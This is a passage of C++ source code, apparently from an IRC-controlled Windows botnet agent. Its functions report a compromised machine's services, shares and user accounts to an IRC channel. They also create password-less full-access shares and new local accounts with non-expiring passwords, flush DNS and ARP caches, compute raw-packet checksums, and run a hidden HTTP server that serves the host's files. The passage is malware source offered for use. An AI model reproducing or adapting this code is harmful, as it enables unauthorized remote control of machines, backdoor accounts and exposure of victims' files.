	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;

	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	irc_privmsg(sock,chan,"The following Windows services are registered:",notice);
 
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			switch (enumeration[i].ServiceStatus.dwCurrentState) {
			case SERVICE_STOPPED:
				sprintf(svcState,"    Stopped");
				break;
			case SERVICE_START_PENDING:
				sprintf(svcState,"   Starting");
				break;
			case SERVICE_STOP_PENDING:
				sprintf(svcState,"    Stoping");
				break;
			case SERVICE_RUNNING:
				sprintf(svcState,"    Running");
				break;
			case SERVICE_CONTINUE_PENDING:
				sprintf(svcState," Continuing");
				break;
			case SERVICE_PAUSE_PENDING:
				sprintf(svcState,"    Pausing");
				break;
			case SERVICE_PAUSED:
				sprintf(svcState,"     Paused");
				break;
			default:
				sprintf(svcState,"    Unknown");
				break;				
			}
			sprintf(buffer,"%s: %s (%s)", svcState, enumeration[i].lpServiceName, enumeration[i].lpDisplayName);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle); 

	if(servicesreturned<=0)
		return FALSE;
	
	return TRUE;
}

char *Shares(int action, char *ShareName, char *SharePath)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (ShareName) {
		switch (action) {
		case NET_ADD:
			if(SharePath || strchr(ShareName,'$'))
				nStatus = ShareAdd(NULL,ShareName,SharePath);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = ShareDel(NULL, ShareName);
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,"%s %s share: '%s'.", mn_title,netcommand[action].completed, ShareName);
		else
			sprintf(buffer,"%s %s: Error with share: '%s'. %s", mn_title,netcommand[action].action, ShareName, NasError(nStatus));
	}
	else 
		sprintf(buffer,"%s %s: No share specified", mn_title,netcommand[action].action);

	return (buffer);
}

static char *AsWideString(const char *cszANSIstring)
{
	if(cszANSIstring == NULL)
		return NULL;
	
	int nBufSize = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, NULL, 0);
	WCHAR *wideString = new WCHAR[nBufSize+1];
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, wideString, nBufSize);
	
	return reinterpret_cast<char*>(wideString);
}

char *AsAnsiString(const WCHAR *cszWIDEstring)
{
	if(cszWIDEstring == NULL)
		return NULL;
	
	int nBufSize = WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, cszWIDEstring, -1, NULL, 0, NULL, NULL);
	static char* ansiString = new char[nBufSize+1];
	WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, cszWIDEstring, -1, ansiString, nBufSize, NULL, NULL);
	
	return reinterpret_cast<char*>(ansiString);
}

NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath)
{
	SHARE_INFO_2 pBuf; // NT only
	DWORD parm_err;

	// Assign values to the SHARES_INFO_2 structure.
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	pBuf.shi2_netname = (LPWSTR)AsWideString(ShareName);
	if (strchr(ShareName, '$'))
		pBuf.shi2_type = STYPE_SPECIAL; // $c, $d, $ipc, $admin
	else
		pBuf.shi2_type = STYPE_DISKTREE; // anything else
	pBuf.shi2_remark = NULL; // No share comment
	pBuf.shi2_permissions = ACCESS_ALL;
	pBuf.shi2_max_uses = -1; // Unlimited
	pBuf.shi2_current_uses = 0;
	pBuf.shi2_path = (LPWSTR)AsWideString(SharePath);
	pBuf.shi2_passwd = NULL; // No password

	// level must be 2 for NT, otherwise it's 50 on 9x (but who cares ;)
	NET_API_STATUS nStatus = fNetShareAdd(wServerName, 2, (LPBYTE)&pBuf, &parm_err);

	return (nStatus);
}

NET_API_STATUS ShareDel(char *ServerName, char *ShareName)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wShareName = (LPWSTR)AsWideString(ShareName);

	NET_API_STATUS nStatus = fNetShareDel(wServerName,wShareName,0);  

	return (nStatus);
}

BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{
	char buffer[IRCLINE];

	PSHARE_INFO_502 pBuf,p;
	NET_API_STATUS nStatus;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD entriesread=0,totalread=0,resume=0;

	irc_privmsg(sock,chan,"Share name:    Resource:                Uses:  Desc:",notice);
 
	do {
		nStatus = fNetShareEnum(wServerName, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

		if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
			p = pBuf;
 
			for(unsigned int i=1;i <= entriesread;i++) {
	            sprintf(buffer,"%-14S %-24S %-6u %-4s",p->shi502_netname, p->shi502_path, p->shi502_current_uses, IsVSD(fIsValidSecurityDescriptor(p->shi502_security_descriptor)));
				irc_privmsg(sock,chan,buffer,notice,TRUE);

				p++;
			}

			fNetApiBufferFree(pBuf);
		} else {
			sprintf(buffer,"%s Share list error: %s <%ld>",mn_title,NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}
	} while (nStatus == ERROR_MORE_DATA);	

	if(nStatus != ERROR_SUCCESS)
		return FALSE;
	
	return TRUE;
}

char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (Username) {
		switch (action) {
		case NET_ADD:
			if(Username && Password)
				nStatus = UserAdd(NULL,Username,Password);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = UserDel(NULL, Username);
			break;
		case NET_INFO:
			nStatus = UserInfo(NULL,Username,sock,chan,notice);
			break;
		default:
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,"%s %s username: '%s'", mn_title,netcommand[action].completed, Username);
		else
			sprintf(buffer,"%s %s: Error with username: '%s'. %s", mn_title,netcommand[action].action, Username, NasError(nStatus));
	}
	else 
		sprintf(buffer,"%s %s: No username specified", mn_title,netcommand[action].action);

	return (buffer);
}

NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password)
{
	USER_INFO_1 ui;
	DWORD dwLevel = 1, dwError = 0;

	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	ui.usri1_name = (LPWSTR)AsWideString(Username);
	ui.usri1_password = (LPWSTR)AsWideString(Password);
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
	ui.usri1_script_path = NULL;

	NET_API_STATUS nStatus = fNetUserAdd(wServerName,dwLevel,(LPBYTE)&ui,&dwError);

	return (nStatus);
}

NET_API_STATUS UserDel(char *ServerName, char *Username)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);

	NET_API_STATUS nStatus = fNetUserDel(wServerName,wUsername);  

	return (nStatus);
}

NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], *user_priv;

	LPUSER_INFO_11 pBuf = NULL;
	DWORD dwLevel = 11;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);
	
	NET_API_STATUS nStatus = fNetUserGetInfo(wServerName,wUsername,dwLevel,(LPBYTE *)&pBuf);

	if (nStatus == NERR_Success) {
		if (pBuf != NULL) {
			sprintf(buffer,"Account: %S",pBuf->usri11_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Full Name: %S",pBuf->usri11_full_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User Comment: %S",pBuf->usri11_usr_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Comment: %S",pBuf->usri11_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			switch(pBuf->usri11_priv) {
			case USER_PRIV_GUEST: 
				user_priv = TEXT("Guest"); 
				break;
			case USER_PRIV_USER:
				user_priv = TEXT("User");
				break;
			case USER_PRIV_ADMIN: 
				user_priv = TEXT("Administrator");
				break;
			default:
				user_priv = TEXT("Unknown");
				break;
			}
			sprintf(buffer,"Privilege Level: %s",user_priv);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Auth Flags: %d",pBuf->usri11_auth_flags);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Home Directory: %S",pBuf->usri11_home_dir);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Parameters: %S",pBuf->usri11_parms);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Password Age: %d",pBuf->usri11_password_age);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Bad Password Count: %d",pBuf->usri11_bad_pw_count);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Number of Logins: %d",pBuf->usri11_num_logons);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logon: %d",pBuf->usri11_last_logon);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logoff: %d",pBuf->usri11_last_logoff);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Logon Server: %S",pBuf->usri11_logon_server);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Workstations: %S",pBuf->usri11_workstations);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Country Code: %d",pBuf->usri11_country_code);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User's Language: %d",pBuf->usri11_code_page);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Max. Storage: %d",pBuf->usri11_max_storage);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Units Per Week: %d",pBuf->usri11_units_per_week);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
	}
	else {
		sprintf(buffer,"%s User info error: <%ld>",mn_title,nStatus);
		irc_privmsg(sock,chan,buffer,notice);
	}

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	return (nStatus);
}

BOOL ListUsers(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{

	char buffer[IRCLINE];

	LPUSER_INFO_0 pBuf=NULL, pTmpBuf;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD dwLevel=0,dwPrefMaxLen=MAX_PREFERRED_LENGTH,dwEntriesRead=0,
		dwTotalEntries=0,dwResumeHandle=0,dwTotalCount=0;
	NET_API_STATUS nStatus;

	irc_privmsg(sock,chan,"Username accounts for local system:",notice);

	do {
		nStatus = fNetUserEnum(wServerName,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,
			dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);
      
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((pTmpBuf = pBuf) != NULL) {
				for (DWORD i = 0;i < dwEntriesRead; i++) {
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL) {
						sprintf(buffer,"%s An access violation has occured",mn_title);
						irc_privmsg(sock,chan,buffer,notice);
						break;
					}

					sprintf(buffer,"  %S",pTmpBuf->usri0_name);
					irc_privmsg(sock,chan,buffer,notice,TRUE);

					pTmpBuf++;
					dwTotalCount++;
				}
			}
		} else {
			sprintf(buffer,"%s User list error: %s <%ld>",mn_title,NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}

		if (pBuf != NULL) {
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (nStatus == ERROR_MORE_DATA);

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	sprintf(buffer,"Total users found: %d.",dwTotalCount);
	irc_privmsg(sock,chan,buffer,notice);

	if(nStatus != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}

static char *NasError(NET_API_STATUS nStatus)
{
	static char retError[90];

	switch (nStatus) {
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"Access denied.");
		break;
	case ERROR_INVALID_LEVEL:
		sprintf(retError,"Level parameter is invalid.");
		break;
	case ERROR_INVALID_NAME:
		sprintf(retError,"The name is invalid.");
		break;
	case ERROR_INVALID_PARAMETER:
		sprintf(retError,"Invalid parameter.");
		break;
	case ERROR_NOT_ENOUGH_MEMORY:
		sprintf(retError,"Not enough memory.");
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(retError,"This network request is not supported.");
		break;
	case ERROR_BAD_NETPATH:
		sprintf(retError,"Server name not found.");
		break;
	case NERR_NetNameNotFound:
		sprintf(retError,"Share not found.");
		break;
	case NERR_DuplicateShare:
		sprintf(retError,"Duplicate share name.");
		break;
	case NERR_RedirectedPath:
		sprintf(retError,"Invalid for redirected resource.");
		break;
	case NERR_UnknownDevDir:
		sprintf(retError,"Device or directory does not exist.");
		break;
	case NERR_InvalidComputer:
		sprintf(retError,"The computer name is invalid.");
		break;
	case NERR_NotPrimary:
		sprintf(retError,"The operation is allowed only on the primary domain controller of the domain.");
		break;
	case NERR_GroupExists:
		sprintf(retError,"The group already exists.");
		break;
	case NERR_UserExists:
		sprintf(retError,"The user account already exists.");
		break;
	case NERR_PasswordTooShort:
		sprintf(retError,"The password is shorter than required (or does not meet the password policy requirement.)");
		break;
	case NERR_UseNotFound:
		sprintf(retError,"Network connection not found.");
		break;
	case NERR_NetworkError:
		sprintf(retError,"A general failure occurred in the network hardware.");
		break;
	case NERR_NameNotFound:
	case NERR_UserNotFound:
		sprintf(retError,"The user name could not be found.");
		break;
	default:
		sprintf(retError,"An unknown error occurred.");
		break;
	}			

	return (retError);
}

char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];

	wchar_t wserver[MAX_PATH+4], wmsg[IRCLINE];
	mbstowcs(wmsg, msg, IRCLINE);

	char Server[MAX_PATH+4];
	DWORD szServer = sizeof(Server);
	GetComputerName(Server, &szServer);	
	mbstowcs(wserver, Server, MAX_PATH+4);
	
	NET_API_STATUS nStatus = fNetMessageBufferSend(NULL, wserver, NULL, (LPBYTE)&wmsg, wcslen(wmsg)*2);

	if(nStatus == NERR_Success)
		sprintf(buffer,"%s Message sent successfully",mn_title);
	else
		sprintf(buffer,"%s %s <Server: %S> <Message: %S>", mn_title, NasError(nStatus), wserver, wmsg);

	return (buffer);
}
#endif

BOOL PrivateIP(const char *ip)
{	
	if (ip) {
		if (strcmp(ip, "") != 0) {
			char *token, ipbuf[32]; 	
			strncpy(ipbuf, ip, sizeof(ipbuf)); 
			if ((token=strtok(ipbuf, ".")) != NULL) { 
				int ip1 = atoi(token);
				if ((token=strtok(NULL, ".")) != NULL) {
					int ip2 = atoi(token);

					if ((ip1 == 10)	
						|| (ip1 == 172 && ip2 > 15 && ip2 < 32)	
						|| (ip1 == 192 && ip2 == 168))
						return TRUE;
				}
			}
		}
	}
	return FALSE; 
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}

BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet = fDnsFlushResolverCache();

	return (bRet);
}

BOOL FlushARPCache(void)
{
    char logbuf[LOGLINE];
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	BOOL bRet = TRUE;
	
    DWORD result = fGetIpNetTable(NULL, &tsize, TRUE);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		memset((LPVOID)arp, 0, tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, TRUE)) != ERROR_SUCCESS) {
				sprintf(logbuf,"%s Error getting ARP cache  %d ",mn_title,result);
				bRet = FALSE;
			}
		} else {
			sprintf(logbuf,"%s Unable to allocation ARP cache",mn_title);
			bRet = FALSE;
		}
		break;
	case ERROR_NO_DATA:
		sprintf(logbuf,"%s ARP cache is empty",mn_title);
		bRet = FALSE;
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(logbuf,"%s Not supported by this system",mn_title);
		bRet = FALSE;
		break;
	default:
		sprintf(logbuf,"%s Error getting ARP cache %d",mn_title,result);
		bRet = FALSE;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	} else
		addlog(logbuf);
	free(arp);

	return (bRet);
}

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	unsigned short answer = 0;
	register unsigned short *w = addr;
	register int nleft = len;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}

#ifndef NO_HTTPD

DWORD WINAPI HTTP_Server_Thread(LPVOID param) 
{
	HTTPD httpd = *((HTTPD *)param);
	HTTPD *httpds = (HTTPD *)param;
	httpds->info = TRUE;
	
	char sendbuf[IRCLINE], buffer[4096], rBuffer[4096], file[MAX_PATH], *file_to_send = "\0";

	int gsin_len;
    unsigned int i,r,b, max;
	unsigned long mode = 1;

	SOCKET gsock, ssock;
	SOCKADDR_IN  gsin, ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)httpd.port);
	ssin.sin_addr.s_addr = INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		threads[httpd.threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (flisten(ssock, SOMAXCONN) != SOCKET_ERROR) {
				if (fioctlsocket(ssock,FIONBIO,&mode) != SOCKET_ERROR) {

					fd_set master, temp; 
					FD_ZERO(&master); 
					FD_ZERO(&temp);
					FD_SET(ssock, &master);
					max = ssock;

					while (1) {
						temp = master;
						if (fselect(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR)
							break;
          
						for(i=0; i <= max; i++) {
							if (fFD_ISSET(i, &temp)) { //there is somthing to do 
								if (i == ssock) {
									//there is a new connection request
									gsin_len = sizeof(gsin);

									if ((gsock = faccept(ssock, (LPSOCKADDR)&gsin, &gsin_len)) == INVALID_SOCKET)  
										continue; 
									else {
										FD_SET(gsock, &master); // add to master set
										if (gsock > (unsigned int)max)  
											max = gsock;
									}
								} else {
    								memset(buffer,0,sizeof(buffer));
									memset(rBuffer,0,sizeof(rBuffer));
									if (frecv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
										fclosesocket(i); 
										FD_CLR(i, &master); // remove from master set
									} else {
										memset(file,0,sizeof(file));
										for (b=0,r=0; b<strlen(buffer); b++,r++) {
											rBuffer[r] = buffer[b];
											if (buffer[b] == '\n') {  //check the request....
												if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
													file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
													strcpy(file,file_to_send);
												} else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
													FD_CLR(i, &master);
													if (file != NULL) {
														if (strlen(file)+strlen(httpd.dir) < MAX_PATH) { 
															unsigned long mode2 = 0;
															fioctlsocket(i,FIONBIO,&mode2);
															Check_Requested_File(i,httpd.dir,file,httpd.enabled,httpd.threadnum);
														} else 
															fclosesocket(i);
													} else 
														fclosesocket(i);
													break;
												}
												memset(rBuffer,0,sizeof(rBuffer));
												r=-1;
											}
										}
									}
								}
							}
                		} 
        			}
				}
			}
		}
	}
	
	sprintf(sendbuf, "%s Error: server failed, returned  %d ", mn_title,fWSAGetLastError());
	if (!httpd.silent) irc_privmsg(httpd.sock, httpd.chan, sendbuf, httpd.notice);
	addlog(sendbuf);

	fclosesocket(ssock);
	clearthread(httpd.threadnum);

	ExitThread(0);
}

DWORD WINAPI HTTP_Header(LPVOID param)
{
	HTTPD httpd = *((HTTPD *)param);
	HTTPD *httpds = (HTTPD *)param;
	httpds->info = TRUE;

	char tFile[MAX_PATH], nFile[MAX_PATH], content[50], buffer[4096], date[70], time[30];

	sprintf(tFile,httpd.file); 
	sprintf(nFile,httpd.path); 

	if (httpd.type) 
		sprintf(content,"text/html");
	else 
		sprintf(content,"application/octet-stream");

	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);

	if (httpd.length == -1)
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,date,time,date,time,date,time);
	else
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nContent-Length: %i\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,httpd.length,date,time,date,time,date,time);
	fsend(httpd.sock,buffer,strlen(buffer),0);

	if (httpd.type == FALSE) 
		HTTP_Send_File(httpd.sock,tFile);
	else 
		GetFiles(tFile,httpd.sock,NULL,nFile); 

	fclosesocket(httpd.sock);
	clearthread(httpd.threadnum);

	ExitThread(0);
}

int Check_Requested_File(SOCKET sock, char *dir ,char *rFile, BOOL dirinfo, int threadnum)
{
	char buffer[IRCLINE], file[MAX_PATH], nFile[MAX_PATH], tFile[MAX_PATH];

	DWORD c,d, id;
	BOOL directory = FALSE;

	memset(nFile,0,sizeof(nFile));
	if (rFile[0] != 47) 
		sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c=0,d=0; c<strlen(file); c++,d++) {
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		} else 
			nFile[d] = ((file[c] == 47)?(92):(file[c]));
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");

	switch(GetFileAttributes(tFile)) {
	case FILE_ATTRIBUTE_DIRECTORY:
		directory = TRUE;
		break;
	case 0xFFFFFFFF:
		fclosesocket(sock);
		return 0;
	}

	if (nFile[d-1] == 92) 
		directory = TRUE;

	HTTPD httpd;
	httpd.sock = sock;
	httpd.info = FALSE;

	if (directory) {
		if (dirinfo) {
			strcat(tFile,"*");
			sprintf(httpd.file,tFile);

			File_To_HTML(nFile);
			sprintf(httpd.path,nFile);

			httpd.type = TRUE;
			httpd.length = -1;
		} else {
			fclosesocket(sock);

			return 0;
		}
	} else {
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      	if (testfile != INVALID_HANDLE_VALUE) {
			sprintf(httpd.file,tFile);

			httpd.type = FALSE;
			httpd.length = GetFileSize(testfile,NULL);

			CloseHandle(testfile);
		}
	}
	
	sprintf(buffer,"%s Worker thread of server thread: %d", mn_title,threadnum);
	httpd.threadnum = addthread(buffer,HTTP_THREAD,NULL);
	threads[httpd.threadnum].parent = threadnum;
	if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Header, (LPVOID)&httpd, 0, &id)) {
		while (httpd.info == FALSE) 
			Sleep(5);
	} else {
		fclosesocket(sock);
		sprintf(buffer,"%s Failed to start worker thread, error  %d ", mn_title,GetLastError());
		addlog(buffer);
	}

	return 0;
}

int GetFiles(char *current, SOCKET sock, char *chan, char *URL)
{
	FILETIME ftBuf;
	SYSTEMTIME stBuf;
	WIN32_FIND_DATA WFD;
		
	char sendbuf[IRCLINE],parent[MAX_PATH],tmpDate[40],tmpDir[MAX_PATH+2];
	int count=0, count2=0;
	unsigned int COL1=230, COL2=150, COL3=60, FILESIZE=30;
  
	memset(parent,0,sizeof(parent));
	strtok(current,"\n");
	if (chan) 
		_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :Searching for: %s\r\n",chan,current);
	else 
		if (URL) {
			current[(strlen(current)-1)]=0;

			_snprintf(sendbuf,sizeof(sendbuf),"<HTML>\r\n<HEAD>\r\n<TITLE>Index of %s</TITLE>\r\n</HEAD>\r\n<BODY>\r\n", 
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<H1>Index of %s</H1>\r\n<TABLE BORDER=\"0\">\r\n", 
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			current[(strlen(current))]='*';

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD WIDTH=\"%d\"><CODE>Name</CODE></TD>\r\n<TD WIDTH=\"%d\"><CODE>Last Modified</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>Size</CODE></TD>\r\n</TR>\r\n", 
				COL1, COL2, COL3);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n");
		} else 
			_snprintf(sendbuf,sizeof(sendbuf),"Searching for: %s\r\n",current);

	fsend(sock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		unsigned int c;

		for (c=strlen(URL)-3; c!=0; c--)
			if (URL[c] == 47) 
				break;
		strncpy(parent,URL,c+1);

		_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><A HREF=\"%s\"><CODE>Parent Directory</CODE></A></TD>\r\n</TR>\r\n",parent);
		fsend(sock,sendbuf,strlen(sendbuf),0);
	}

	HANDLE Hnd = FindFirstFile(current, &WFD);
	while (FindNextFile(Hnd, &WFD)) {
		if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, "."))) {
			FileTimeToLocalFileTime(&WFD.ftLastWriteTime, &ftBuf);
			FileTimeToSystemTime(&ftBuf, &stBuf);
			sprintf(tmpDate, "%2.2d/%2.2d/%4d  %2.2d:%2.2d %s",
				stBuf.wMonth, stBuf.wDay, stBuf.wYear, HOUR(stBuf.wHour), stBuf.wMinute, AMPM(stBuf.wHour));

			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (chan) { 
					_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s\n",chan,tmpDir, tmpDate);
				} else 
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s/",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>FILESIZE)
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.29s&gt;/</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s/</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>-</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3);
					} else {
						_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
